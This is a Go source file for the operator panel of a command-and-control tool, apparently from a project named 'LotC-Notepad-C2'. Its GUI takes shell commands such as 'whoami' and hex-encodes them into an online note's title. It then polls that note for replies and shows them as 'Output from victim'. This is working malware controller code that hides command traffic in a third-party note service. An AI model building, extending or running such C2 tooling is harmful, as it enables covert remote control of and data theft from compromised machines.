package main

import (
	"strings"
	"time"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/widget"
	"github.com/uokik/LotC-Notepad-C2/internal/config"
	"github.com/uokik/LotC-Notepad-C2/internal/protocol"
	"github.com/uokik/LotC-Notepad-C2/internal/transport"
)

func main() {

	myApp := app.New()
	myWindow := myApp.NewWindow("Operator Panel ")

	myWindow.Resize(fyne.NewSize(800, 700))

	inputLabel := widget.NewLabel("Enter command:")
	inputEntry := widget.NewEntry()
	inputEntry.SetPlaceHolder("e.g. whoami")

	statusLabel := widget.NewLabel("Status: Connected")

	outputLabel := widget.NewLabel("Output from victim:")

	outputArea := widget.NewRichTextFromMarkdown("```\nOczekiwanie na dane...\n```")

	sendButton := widget.NewButton("Send command", func() {
		cmdText := strings.TrimSpace(inputEntry.Text)
		if cmdText == "" {
			statusLabel.SetText("error: Command cant be blank")
			return
		}

		statusLabel.SetText("Sending...")
		cmdPayload := "v91:" + cmdText
		hexPayload := protocol.Encode(cmdPayload)

		err := transport.UpdateTitle(config.NoteID, config.SessionToken, config.EditID, hexPayload)
		if err != nil {
			statusLabel.SetText("error: " + err.Error())
			return
		}

		statusLabel.SetText("Command sent. Waiting for output...")
		inputEntry.SetText("")

		go func() {
			for {
				time.Sleep(3 * time.Second)

				rawContentHex, netErr := transport.FetchResponse(config.NoteID, config.SessionToken)

				if netErr != nil {
					continue
				}

				decodedResponse, decErr := protocol.Decode(rawContentHex)

				if decErr != nil {
					continue
				}

				decodedResponse = strings.TrimSpace(decodedResponse)

				if !strings.HasPrefix(decodedResponse, "v92:") {
					continue
				}

				resultText := strings.TrimPrefix(decodedResponse, "v92:")

				markdownResult := "```\n" + resultText + "\n```"

				fyne.Do(func() {
					outputArea.ParseMarkdown(markdownResult)
					statusLabel.SetText("Output received successfully")
				})

				break
			}
		}()
	})

	topControls := container.NewVBox(
		inputLabel,
		inputEntry,
		sendButton,
		statusLabel,
		outputLabel,
	)

	content := container.NewBorder(
		topControls,
		nil,
		nil,
		nil,
		container.NewScroll(outputArea),
	)

	myWindow.SetContent(content)
	myWindow.ShowAndRun()
}
